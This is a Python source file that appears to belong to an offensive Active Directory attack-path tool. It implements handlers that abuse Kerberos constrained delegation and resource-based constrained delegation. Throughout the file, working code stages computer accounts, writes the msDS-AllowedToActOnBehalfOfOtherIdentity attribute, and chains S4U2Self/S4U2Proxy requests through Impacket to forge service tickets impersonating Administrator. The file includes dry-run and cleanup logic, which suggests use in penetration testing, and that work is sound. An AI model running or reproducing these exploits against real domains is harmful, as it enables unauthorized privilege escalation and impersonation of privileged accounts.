"""Kerberos delegation edge exploitation handlers.

Handles AllowedToDelegate (constrained delegation), AllowedToAct (RBCD),
and WriteAccountRestrictions (write msDS-AllowedToActOnBehalfOfOtherIdentity).
"""

from __future__ import annotations

import re
import secrets
import string

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody
from pathstrike.tools import impacket_wrapper as impacket

# userAccountControl flag: account is trusted for protocol-transition S4U.
_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000


def _random_password(length: int = 16) -> str:
    """Generate a throwaway password for a staged computer account."""
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length)) + "Aa1!"


def _saved_ccache(result: dict) -> str | None:
    """Pull the ccache path getST.py reports — see impacket.parse_saved_ccache."""
    return impacket.parse_saved_ccache(result)


@register_handler("AllowedToDelegate")
class AllowedToDelegateHandler(BaseEdgeHandler):
    """Handles AllowedToDelegate (constrained delegation) edges.

    The source account is configured with ``msDS-AllowedToDelegateTo``
    pointing at a service on the target.  We use Impacket ``getST.py``
    to perform S4U2Proxy and obtain a service ticket impersonating a
    privileged user.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        # Constrained delegation requires that we have credentials for the
        # source account (the delegating account).
        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        if not self.cred_store.get_best_credential(principal, domain):
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return False, (
                    f"No credential for delegating account {principal}; "
                    "cannot perform S4U2Proxy"
                )
        return True, f"Constrained delegation from {edge.source.name} to {edge.target.name} is exploitable"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target_fqdn = edge.target.name.split("@")[0]
        impersonate_user = "Administrator"  # Default high-value target
        domain = self._get_domain()
        dc_ip = self._get_dc_host()
        auth_args = self._get_auth_args(principal)
        # Reading userAccountControl / msDS-AllowedToDelegateTo needs no special
        # rights — use the foothold credential, which is always valid, rather
        # than the source principal (whose vault creds may be stale, e.g. a
        # rotated machine-account password).
        read_auth = self._get_auth_args()

        if dry_run:
            return (
                True,
                f"[DRY RUN] Constrained-delegation S4U as {principal} to a "
                f"service on {target_fqdn}, impersonating {impersonate_user}. "
                "Auto-detects protocol transition; if absent, stages an "
                "RBCD-bridge (add computer → RBCD → forwardable S4U → "
                "altservice) and cleans it up.",
                [],
            )

        # In `learn`/emit mode, show BOTH constrained-delegation variants —
        # which one applies depends on the source's protocol-transition flag,
        # which we can't read offline, so enumerate both for the operator.
        from pathstrike.engine.command_emitter import emitting, set_branch
        if emitting():
            set_branch("WITH protocol transition (direct S4U2Self+S4U2Proxy)")
            await self._exploit_with_pt(
                edge, principal, target_fqdn, impersonate_user, domain, dc_ip
            )
            set_branch("WITHOUT protocol transition (RBCD-bridge → forwardable TGS → altservice)")
            await self._exploit_without_pt(
                principal, target_fqdn, impersonate_user, domain, dc_ip,
                auth_args, read_auth,
            )
            set_branch(None)
            return (True, "[emit] enumerated both constrained-delegation variants", [])

        has_pt = await self._has_protocol_transition(read_auth, principal)
        if has_pt is False:
            self.logger.info(
                "%s lacks TRUSTED_TO_AUTH_FOR_DELEGATION (no protocol "
                "transition) — using the RBCD-bridge for a forwardable ticket.",
                principal,
            )
            return await self._exploit_without_pt(
                principal, target_fqdn, impersonate_user, domain, dc_ip,
                auth_args, read_auth,
            )

        # Protocol transition present (or undetermined → assume the simple
        # path): a single getST does S4U2Self+S4U2Proxy and yields a usable
        # forwardable ticket.
        return await self._exploit_with_pt(
            edge, principal, target_fqdn, impersonate_user, domain, dc_ip
        )

    async def _exploit_with_pt(
        self, edge, principal, target_fqdn, impersonate_user, domain, dc_ip
    ) -> tuple[bool, str, list[Credential]]:
        spn = edge.properties.get("spn") or f"cifs/{target_fqdn}"
        self.logger.info(
            "Performing S4U2Self+S4U2Proxy: %s -> %s (impersonating %s)",
            principal, spn, impersonate_user,
        )
        _target_str, auth_flags = self._get_impacket_auth(principal)
        password, nt_hash = self._impacket_secret(principal, domain)

        result = await impacket.get_st(
            spn=spn, impersonate=impersonate_user, auth_args=auth_flags,
            domain=domain, username=principal, password=password,
            nt_hash=nt_hash, dc_ip=dc_ip,
        )
        if not result["success"]:
            return False, f"S4U2Proxy failed: {result.get('error', 'unknown')}", []

        ccache = _saved_ccache(result) or f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
        return (
            True,
            f"Obtained service ticket for {impersonate_user} to {spn}",
            [Credential(
                cred_type=CredentialType.ccache, value=ccache,
                username=impersonate_user, domain=domain,
                obtained_from=f"S4U2Proxy via constrained delegation ({principal} -> {spn})",
            )],
        )

    async def _exploit_without_pt(
        self, principal, target_fqdn, impersonate_user, domain, dc_ip,
        auth_args, read_auth,
    ) -> tuple[bool, str, list[Credential]]:
        """KCD without protocol transition (the RBCD-bridge).

        A plain S4U2Self on a non-protocol-transition account yields a
        *non-forwardable* TGS, so S4U2Proxy fails.  The bridge: stage a
        controlled computer with an SPN, point the constrained account's RBCD
        at it, S4U2Self+S4U2Proxy *as the bridge* to obtain a **forwardable**
        TGS to the constrained account, then feed that as the additional
        ticket to the real S4U2Proxy (with ``-altservice`` to land on a useful
        service).  Everything staged is cleaned up afterwards.
        """
        allowed = await self._read_allowed_delegate_spns(read_auth, principal)
        if not allowed:
            from pathstrike.engine.command_emitter import emitting
            if emitting():
                # The SPN read returns nothing offline; use a placeholder so the
                # rest of the bridge chain still emits for the playbook.
                allowed = ["<allowed-SPN-from-msDS-AllowedToDelegateTo>"]
            else:
                return (
                    False,
                    f"{principal} has no readable msDS-AllowedToDelegateTo SPN; "
                    "cannot determine a delegation target.",
                    [],
                )
        req_spn = allowed[0]  # must be in the allowed list for S4U2Proxy
        target_short = target_fqdn.split(".")[0]
        alt_spn = f"cifs/{target_short}"
        constrained_short = principal[:-1] if principal.endswith("$") else principal

        bridge = "rbcd_const"
        bridge_sam = f"{bridge}$"
        bridge_pass = _random_password()
        constrained_pw, constrained_nt = self._impacket_secret(principal, domain)
        _ts, constrained_auth = self._get_impacket_auth(principal)

        self.logger.info("RBCD-bridge: creating staging computer %s", bridge_sam)
        add = await bloody.add_computer(self.config, auth_args, bridge, bridge_pass)
        if not add["success"]:
            return (
                False,
                f"RBCD-bridge: could not create computer {bridge_sam}: "
                f"{add.get('error', 'unknown')} (needs ms-DS-MachineAccountQuota > 0).",
                [],
            )
        try:
            # Constrained account writes RBCD on *itself*, pointing at the bridge.
            self.logger.info("RBCD-bridge: setting RBCD on %s for %s", principal, bridge_sam)
            rbcd = await bloody.set_rbcd(self.config, auth_args, principal, bridge_sam)
            if not rbcd["success"]:
                return False, f"RBCD-bridge: failed to set RBCD on {principal}: {rbcd.get('error', 'unknown')}", []

            # As the bridge: S4U2Self+S4U2Proxy → forwardable TGS to host/<constrained>.
            bridge_spn = f"host/{constrained_short}"
            bridge_auth = impacket.build_impacket_auth(
                domain, bridge_sam, bridge_pass, None, None, None, dc_ip
            )
            self.logger.info("RBCD-bridge: forging forwardable TGS via %s → %s", bridge_sam, bridge_spn)
            st1 = await impacket.get_st(
                spn=bridge_spn, impersonate=impersonate_user, auth_args=bridge_auth,
                domain=domain, username=bridge_sam, password=bridge_pass, dc_ip=dc_ip,
            )
            if not st1["success"]:
                return False, f"RBCD-bridge: S4U via {bridge_sam} failed: {st1.get('error', 'unknown')}", []
            fwd_ccache = _saved_ccache(st1)
            if not fwd_ccache:
                return False, "RBCD-bridge: could not locate the forwardable ccache from the bridge S4U.", []

            # Final S4U2Proxy as the constrained account, feeding the forwardable
            # ticket and swapping to a useful service via -altservice.
            self.logger.info(
                "RBCD-bridge: final S4U2Proxy %s -> %s (altservice %s)",
                principal, req_spn, alt_spn,
            )
            st2 = await impacket.get_st(
                spn=req_spn, impersonate=impersonate_user, auth_args=constrained_auth,
                domain=domain, username=principal, password=constrained_pw,
                nt_hash=constrained_nt, dc_ip=dc_ip,
                additional_ticket=fwd_ccache, altservice=alt_spn,
            )
            if not st2["success"]:
                return False, f"RBCD-bridge: final S4U2Proxy to {req_spn} failed: {st2.get('error', 'unknown')}", []

            final_ccache = _saved_ccache(st2) or f"{impersonate_user}@{alt_spn.replace('/', '_')}.ccache"
            return (
                True,
                f"Obtained forwardable service ticket for {impersonate_user} to "
                f"{alt_spn} via RBCD-bridge (no protocol transition on {principal})",
                [Credential(
                    cred_type=CredentialType.ccache, value=final_ccache,
                    username=impersonate_user, domain=domain,
                    obtained_from=f"KCD-no-PT RBCD-bridge ({principal} -> {alt_spn})",
                )],
            )
        finally:
            # Always tear down the staged RBCD + computer account.
            # The constrained account can write its own RBCD attribute, so it
            # removes that itself.
            try:
                await bloody.remove_rbcd(self.config, auth_args, principal, bridge_sam)
            except Exception as exc:  # pragma: no cover - best-effort cleanup
                self.logger.warning("RBCD-bridge cleanup: remove_rbcd failed: %s", exc)

            if await self._delete_staged_computer(bridge, auth_args):
                self.logger.info(
                    "RBCD-bridge: cleaned up (removed RBCD on %s, deleted %s)",
                    principal, bridge_sam,
                )
            else:
                self.logger.warning(
                    "RBCD-bridge: removed RBCD on %s but could NOT delete staged "
                    "computer %s. Delete it manually with a privileged account: "
                    "bloodyAD remove object '%s'",
                    principal, bridge_sam, bridge_sam,
                )

    def _impacket_secret(self, principal: str, domain: str) -> tuple[str | None, str | None]:
        """Return ``(password, nt_hash)`` for *principal* from the store/config."""
        cred = self.cred_store.get_best_credential(principal, domain)
        if cred and cred.cred_type == CredentialType.password:
            return cred.value, None
        if cred and cred.cred_type == CredentialType.nt_hash:
            return None, cred.value
        return self.config.credentials.password, self.config.credentials.nt_hash

    async def _has_protocol_transition(self, auth_args, principal) -> bool | None:
        """Whether *principal* has TRUSTED_TO_AUTH_FOR_DELEGATION.

        Returns ``True``/``False``, or ``None`` if it can't be determined (the
        caller then defaults to the simple S4U path).
        """
        res = await bloody.run_bloodyad(
            ["get", "object", principal, "--attr", "userAccountControl"],
            self.config, auth_args=auth_args,
        )
        if not res.get("success"):
            return None
        out = res.get("output", "")
        if "userAccountControl" not in out:
            return None  # couldn't actually read the attribute
        if "TRUSTED_TO_AUTH_FOR_DELEGATION" in out:
            return True
        # bloodyAD may print a raw integer instead of decoded flag names.
        m = re.search(r"userAccountControl\D*?(\d{3,})", out)
        if m:
            return bool(int(m.group(1)) & _TRUSTED_TO_AUTH_FOR_DELEGATION)
        # We read the attribute (decoded flag names) and the protocol-transition
        # flag is absent → definitively no protocol transition.
        return False

    async def _read_allowed_delegate_spns(self, auth_args, principal) -> list[str]:
        """Read msDS-AllowedToDelegateTo SPNs from the delegating account."""
        res = await bloody.run_bloodyad(
            ["get", "object", principal, "--attr", "msDS-AllowedToDelegateTo"],
            self.config, auth_args=auth_args,
        )
        out = res.get("output", "")
        # bloodyAD prints one SPN per (possibly repeated) attribute line.
        return re.findall(r"([A-Za-z][\w-]*/[^\s;,]+)", out)

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # The simple path makes no AD changes (ticket request only); the
        # RBCD-bridge path cleans up its own staged computer + RBCD inline.
        return None


@register_handler("AllowedToAct")
class AllowedToActHandler(BaseEdgeHandler):
    """Handles AllowedToAct (Resource-Based Constrained Delegation) edges.

    The target's ``msDS-AllowedToActOnBehalfOfOtherIdentity`` already
    includes the source account.  We use Impacket ``getST.py`` to perform
    S4U2Self + S4U2Proxy and obtain a service ticket.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        principal = self._resolve_principal(edge)
        domain = self._get_domain()
        if not self.cred_store.get_best_credential(principal, domain):
            cfg = self.config.credentials
            if cfg.username.lower() != principal.lower():
                return False, (
                    f"No credential for RBCD source account {principal}"
                )
        return True, f"RBCD from {edge.source.name} to {edge.target.name} is exploitable"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        target_fqdn = edge.target.name.split("@")[0]
        spn = f"cifs/{target_fqdn}"
        impersonate_user = "Administrator"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would perform RBCD S4U as {principal} "
                f"for {impersonate_user} to {spn}",
                [],
            )

        self.logger.info(
            "Performing RBCD S4U2Self+S4U2Proxy: %s -> %s (impersonating %s)",
            principal, spn, impersonate_user,
        )

        _target_str, auth_flags = self._get_impacket_auth(principal)
        domain = self._get_domain()
        dc_ip = self._get_dc_host()

        cred = self.cred_store.get_best_credential(principal, domain)
        password = None
        nt_hash = None
        if cred:
            if cred.cred_type == CredentialType.password:
                password = cred.value
            elif cred.cred_type == CredentialType.nt_hash:
                nt_hash = cred.value
        else:
            password = self.config.credentials.password
            nt_hash = self.config.credentials.nt_hash

        result = await impacket.get_st(
            spn=spn,
            impersonate=impersonate_user,
            auth_args=auth_flags,
            domain=domain,
            username=principal,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
        )

        if not result["success"]:
            return False, f"RBCD S4U failed: {result.get('error', 'unknown')}", []

        ccache_file = f"{impersonate_user}@{spn.replace('/', '_')}.ccache"
        new_creds = [
            Credential(
                cred_type=CredentialType.ccache,
                value=ccache_file,
                username=impersonate_user,
                domain=domain,
                obtained_from=f"RBCD S4U ({principal} -> {spn})",
            )
        ]
        return (
            True,
            f"Obtained service ticket for {impersonate_user} to {spn} via RBCD",
            new_creds,
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # RBCD configuration already existed; we only used it.
        return None


@register_handler("WriteAccountRestrictions")
class WriteAccountRestrictionsHandler(BaseEdgeHandler):
    """Handles WriteAccountRestrictions edges.

    (BloodHound CE's ``AddAllowedToAct`` edge has its own dedicated handler in
    ``extended_access.py``; this one covers the SharpHound
    ``WriteAccountRestrictions`` label.)

    The principal can write ``msDS-AllowedToActOnBehalfOfOtherIdentity`` on the
    target computer, enabling a full RBCD attack.  We stage a *new* controlled
    computer account (it has an SPN, so it can S4U2Self — a user/foothold
    principal cannot), point the target's RBCD at it, then S4U2Self+S4U2Proxy
    as the staged account to impersonate a privileged user.  The staged RBCD
    entry and computer account are cleaned up afterwards.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "computer":
            return False, (
                f"WriteAccountRestrictions/AddAllowedToAct targets a Computer, "
                f"got {edge.target.label}"
            )
        return True, f"Can write RBCD attribute on {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target_fqdn = edge.target.name.split("@")[0]
        target_short = target_fqdn.split(".")[0]
        target_sam = target_short if target_short.endswith("$") else f"{target_short}$"
        spn = f"cifs/{target_fqdn}"
        impersonate_user = "Administrator"
        domain = self._get_domain()
        dc_ip = self._get_dc_host()
        write_auth = self._get_auth_args(principal)

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would stage a computer, write RBCD on {target_sam}, "
                f"S4U2Self+S4U2Proxy to {spn} impersonating {impersonate_user}, "
                "then clean up the staged RBCD + computer.",
                [],
            )

        ok, msg, ccache = await self._rbcd_via_staged_computer(
            rbcd_target_sam=target_sam, s4u_spn=spn, impersonate=impersonate_user,
            domain=domain, dc_ip=dc_ip, write_auth=write_auth,
        )
        if not ok:
            return False, msg, []

        new_creds: list[Credential] = []
        if ccache:
            new_creds.append(Credential(
                cred_type=CredentialType.ccache, value=ccache,
                username=impersonate_user, domain=domain,
                obtained_from=f"RBCD via WriteAccountRestrictions/AddAllowedToAct ({target_sam})",
            ))
        return True, msg, new_creds

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # The staged RBCD entry and computer account are removed inline by
        # _rbcd_via_staged_computer, so there is nothing left to roll back.
        return None
